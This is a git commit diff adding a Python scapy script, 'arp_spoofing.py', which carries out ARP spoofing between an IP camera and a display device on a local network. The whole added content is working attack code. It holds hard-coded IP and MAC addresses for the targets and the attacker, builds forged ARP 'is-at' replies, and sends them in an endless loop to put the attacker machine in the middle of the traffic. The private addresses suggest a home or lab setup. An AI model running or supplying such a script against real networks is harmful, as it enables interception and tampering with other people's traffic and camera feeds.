ad86adfaba06bc03a1e85ffd3eed8c68e0c865db
Diogo Soares <diogo.soares05@gmail.com>
2025-12-05 11:46:46 +0100

    added basic arp spoofing script

--- arp_spoofing.py
+++ arp_spoofing.py
@@ -1,5 +1,6 @@
-from scapy.all import *
+from scapy.all import Ether, ARP, sendp
 import time
+import sys
 
 camera_ip = "192.168.0.81"
 camera_mac = "3C:64:CF:5D:C1:F6"
@@ -12,3 +13,31 @@ display_device_mac = "58:1C:F8:51:BD:3C"
 
 attacker_ip = "192.168.0.150"
 attacker_mac = "46:4C:D7:C3:7F:F1"
+
+iface = "Wi-Fi"   
+
+arp_camera = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
+    op="is-at",               
+    hwsrc=attacker_mac,       
+    psrc=display_device_ip,           
+    hwdst="ff:ff:ff:ff:ff:ff", 
+    pdst=camera_ip            
+)
+
+arp_client = Ether(src=attacker_mac, dst=display_device_mac) / ARP(
+    op="is-at",
+    hwsrc=attacker_mac,
+    psrc=camera_ip,           
+    hwdst=display_device_mac,         
+    pdst=display_device_ip            
+)
+
+print(f"[*] Starting ARP Spoofing on {iface}. Press Ctrl+C to stop...")
+try:
+    while True:
+        sendp(arp_camera, iface=iface, verbose=False)
+        sendp(arp_client, iface=iface, verbose=False)
+        time.sleep(3)
+except KeyboardInterrupt:
+    print("\n[*] Stopping attack...")
+    sys.exit(0)
